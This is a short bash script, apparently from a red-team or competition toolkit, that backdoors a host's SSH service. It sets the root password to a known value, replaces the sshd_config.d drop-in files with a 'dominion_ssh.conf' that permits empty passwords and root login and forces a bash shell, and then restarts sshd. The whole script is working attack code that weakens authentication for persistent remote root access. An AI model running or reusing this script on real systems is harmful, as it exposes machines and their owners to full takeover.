#!/bin/bash

echo "root:Password123!" | chpasswd

if ! grep -q -Fx "Include /etc/ssh/sshd_config.d/*.conf" /etc/ssh/sshd_config; then
  echo "Include /etc/ssh/sshd_config.d/*.conf" >> /etc/ssh/sshd_config
fi

cp -r /etc/ssh/sshd_config.d /etc/ssh/backup_sshd_config.d
rm -rf /etc/ssh/sshd_config.d
mkdir /etc/ssh/sshd_config.d

echo "PubkeyAuthentication yes" > /etc/ssh/sshd_config.d/dominion_ssh.conf
echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config.d/dominion_ssh.conf
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config.d/dominion_ssh.conf
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config.d/dominion_ssh.conf
echo "ForceCommand /bin/bash" >> /etc/ssh/sshd_config.d/dominion_ssh.conf

if [ "${cmd}" == "systemctl" ]; then
  $sys restart ssh 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "Successfully restarted ssh"
  else
    $sys restart sshd 2>/dev/null
    if [ $? -eq 0 ]; then
      echo "Successfully restarted sshd"
    else
      echo "systemctl could not restart sshd/ssh"
    fi
  fi
elif [ "${cmd}" == "service" ]; then
  $sys ssh restart 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "Successfully restarted ssh"
  else
    $sys sshd restart 2>/dev/null
    if [ $? -eq 0 ]; then
      echo "Successfully restarted ssh"
    else
      echo "service could not restart sshd/ssh"
    fi
  fi
else
  $sys restart 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "/etc/rc.d/sshd successfully restarted ssh"
  else
    echo "/etc/rc.d/sshd could not restart ssh"
  fi
fi